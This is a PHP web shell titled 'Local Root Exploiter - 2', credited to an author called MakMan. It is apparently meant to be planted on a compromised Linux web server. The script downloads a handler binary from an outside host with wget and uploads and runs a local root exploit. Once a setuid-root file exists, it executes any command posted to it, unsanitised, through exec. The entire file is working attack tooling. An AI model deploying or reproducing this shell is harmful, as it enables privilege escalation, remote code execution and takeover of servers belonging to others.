<?php
/*
-- By MakMan
-- http://www.mukarramkhalid.com
-- http://makman.tk
-- https://www.facebook.com/makmaniac
-- https://twitter.com/themakmaniac
*/

ini_set('error_reporting', 0);
ini_set('max_execution_time', 0);

$handle_url     = "http://makman.tk/scripts/makman";
$path           = getcwd()."/";
$cmd            = ( isset( $_POST["cmd"] ) ? $_POST["cmd"] : '' );
$exploit        = ( isset( $_POST["check_exploit"] ) ? $_FILES["exploit"]["name"] : '' );

?>

<!doctype html>
<html>
<head>
    <meta charset='utf-8'>
    <title>MakMan - Root Exploiter - 2</title>
    <style type='text/css'>
    body
    {
        font:                 normal 15px Verdana;
        color:                #ffffff;
        background-color:     #000000;
    }
    textarea
    {
        width:                100%;
        height:               300px;
        resize:               none;
        overflow-y:           scroll;
    }
    pre
    {
        text-align:           center;
    }
    a
    {
        text-decoration:      none;
        color:                #ff0000;
    }
    a:hover
    {
        text-decoration:      underline;
        color:                #ff0000;
    }
    .green
    {
        font:                  normal 15px Verdana;
        color:                 #00ff00;
        text-align:            center;
    }
    .red
    {
        font:                  normal 15px Verdana;
        color:                 #ff0000;
        text-align:            center;
    }
    </style>
</head>
<body>
<pre>
+-+-+-+-+-+ +-+-+-+-+ +-+-+-+-+-+-+-+-+-+    +-+-+
|L|o|c|a|l| |R|o|o|t| |E|x|p|l|o|i|t|e|r| -- | 2 |
+-+-+-+-+-+ +-+-+-+-+ +-+-+-+-+-+-+-+-+-+    +-+-+
</pre>
<h1 class='red'>By <a href='//mukarramkhalid.com'>MakMan</a></h1>
<pre>
----------------------------------------------------------------------
</pre>
<?php

    ################################      MAKMAN_FUNCTIONS     #################################

    function check_os(  ) {
        if ( strtoupper( substr( PHP_OS, 0, 3 ) ) === "WIN" ) {
            exit( "<p class='red'>Only works on Linux</p></body></html>" );
        }    
    }

    function format_output( $out ) {
        foreach( $out as $o ) {
            echo htmlspecialchars( preg_replace( "/\x1b\[[0-9;]*m/", "", trim( $o ) ) )."\n";
        }
    }

    function check_session(  ) {
        
        global $path;

        clearstatcache(  );
        if( fileowner( $path."makman" ) == 0 && file_exists( $path."makman" ) && filesize( $path."makman" ) != 0 && decoct( fileperms( $path."makman" ) ) == 104755 ) {
            return true;
        }
        else {
            return false;
        }
    }

    function download_module(  ) {

        global $path, $handle_url;

        if( !file_exists( $path."makman" ) || filesize( $path."makman" ) == 0 ) {
            exec( "wget ".$handle_url." -O ".$path."makman" );
            chmod( $path."makman", 0755 );
            if( !file_exists( $path."makman" ) || filesize( $path."makman" ) == 0 ) {
                return false;
            }
            else {
                return true;
            }
        }
        return true;
    }

    function execute($action, $exp) {

        global $path, $handle_url;

        if(download_module()) {
            if( $action == "exploit" ) {
                if( move_uploaded_file( $_FILES["exploit"]["tmp_name"], $path.$exp ) ) {
                    chmod( $path.$exp, 0755 );
                    exec( $path."makman --exploit='".$path.$exp."'", $output );
                    format_output( $output );
                }
                else {
                    echo "Failed to Upload. Check the path ".$path." and set proper permissions.";
                }
            }
            else if ($action == "command") {
                exec( $path."makman --command='".$exp."'", $output );
                format_output($output);
            }
        }
        else {
            echo "Failed to download the handler from ".$handle_url.". Download it manually and save it here ".$path."makman with 'chmod +x'.";
        }
    }
    

    ################################      MAKMAN_MAIN     #########################################

    check_os(  );

    if( check_session(  ) ) {
        
        echo "<p class='green'>Root session exists. Insert commands to execute.</p>";
        echo "<textarea>";
        if( isset( $_POST["cmd"] ) ) {
            execute( "command", $cmd );
        }
        echo "</textarea>";
        echo "
                <center>
                <form method='POST' action=''>
                <input name='cmd' type='text' autofocus><br>
                <input name='Submit' value='Submit' type='submit'><br>
                </form>
                </center>
            ";

    }

    else {

        if( isset( $_POST["check_exploit"] ) ) {
            echo "<textarea>";
            execute( "exploit", $exploit );
            echo "\nRefreshing page in 2 seconds.";
            echo "</textarea>";
            header( "Refresh:2" );
        }
        echo "<p class='red'>Session not found. Upload your local root exploit to execute.</p>";
        echo "
                <center>
                <form method='POST' action='' enctype='multipart/form-data'>
                <input name='check_exploit' type='hidden' value='1'>
                <input name='exploit' type='file'>
                <input name='Submit' value='Submit' type='submit'><br>
                </form>
                </center>
            ";

    }


?>


</body>
</html>